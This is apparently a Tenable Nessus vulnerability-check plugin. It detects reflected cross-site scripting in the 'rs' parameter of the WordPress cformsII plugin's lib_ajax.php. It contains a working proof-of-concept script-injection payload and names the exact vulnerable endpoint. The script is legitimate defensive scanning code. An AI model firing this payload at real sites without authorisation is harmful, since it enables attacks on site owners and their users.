#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(50512);
  script_version("$Revision: 1.13 $");
  script_cvs_date("$Date: 2015/01/13 20:37:05 $");

  script_cve_id("CVE-2010-3977");
  script_bugtraq_id(44587);
  script_osvdb_id(69339);
  script_xref(name:"Secunia", value:"42006");

  script_name(english:"cformsII Plugin for WordPress 'rs' Parameter XSS");
  script_summary(english:"Attempts to inject script code via lib_ajax.php.");

  script_set_attribute(attribute:"synopsis", value:
"The remote web server hosts a PHP script that is vulnerable to a
cross-site scripting attack.");
  script_set_attribute(attribute:"description", value:
"The version of the cformsII plugin for WordPress hosted on the remote
web server fails to sanitize user-supplied input to the 'rs' parameter
of the 'lib_ajax.php' script before using it to generate dynamic HTML
output.

An attacker can leverage this issue to inject arbitrary HTML or script
code into a user's browser to be executed within the security context
of the affected site.

Note that the install is also likely to be vulnerable to a similar
cross-site scripting attack involving the 'rsargs' parameter, although
Nessus has not checked for this particular issue.");
  script_set_attribute(attribute:"see_also", value:"http://www.securityfocus.com/archive/1/514579/30/0/threaded");
  script_set_attribute(attribute:"solution", value:"Unknown at this time.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:M/Au:N/C:N/I:P/A:N");
  script_set_cvss_temporal_vector("CVSS2#E:F/RL:OF/RC:C");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");
  script_cwe_id(20, 74, 79, 442, 629, 711, 712, 722, 725, 750, 751, 800, 801, 809, 811, 864, 900, 928, 931, 990);

  script_set_attribute(attribute:"vuln_publication_date", value:"2010/10/30");
  script_set_attribute(attribute:"plugin_publication_date", value:"2010/11/08");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:wordpress:wordpress");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses : XSS");

  script_copyright(english:"This script is Copyright (C) 2010-2015 Tenable Network Security, Inc.");

  script_dependencies("wordpress_detect.nasl");
  script_require_keys("installed_sw/WordPress", "www/PHP");
  script_require_ports("Services/www", 80);

  exit(0);
}

include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("url_func.inc");
include("webapp_func.inc");

app = "WordPress";
get_install_count(app_name:app, exit_if_zero:TRUE);

port = get_http_port(default:80, php:TRUE);

install = get_single_install(
  app_name : app,
  port     : port
);
dir = install['path'];
install_url = build_url(port:port, qs:dir);

plugin = "cformsII";

# Check KB first
installed = get_kb_item("www/"+port+"/webapp_ext/"+plugin+" under "+dir);

if (!installed)
{
  checks = make_array();
  path = "/wp-content/plugins/";
  checks[path + "cforms/js/cforms.js"][0] = make_list('var sajax_');

  # Ensure plugin is installed
  installed = check_webapp_ext(
    checks : checks,
    dir    : dir,
    port   : port,
    ext     : plugin
  );
}
if (!installed)
  audit(AUDIT_WEB_APP_EXT_NOT_INST, app, install_url, plugin + " plugin");

# Try to exploit the issue.
payload = SCRIPT_NAME;
enc_payload = '';
for(i=0; i<strlen(payload); i++)
{
  enc_payload += ord(payload[i]) + ',';
}
enc_payload = substr(enc_payload, 0, strlen(enc_payload) - 2);
alert = '<script>alert(String.fromCharCode('+enc_payload+'))</script>';

vuln = test_cgi_xss(
  port     : port,
  cgi      : '/wp-content/plugins/cforms/lib_ajax.php',
  dirs     : make_list(dir),
  qs       : 'rs='+urlencode(str:alert),
  pass_str : '-:' + alert + ' not callable',
  pass2_re : ' not callable'
);
if (!vuln)
  audit(AUDIT_WEB_APP_EXT_NOT_AFFECTED, app, install_url, plugin + " plugin");
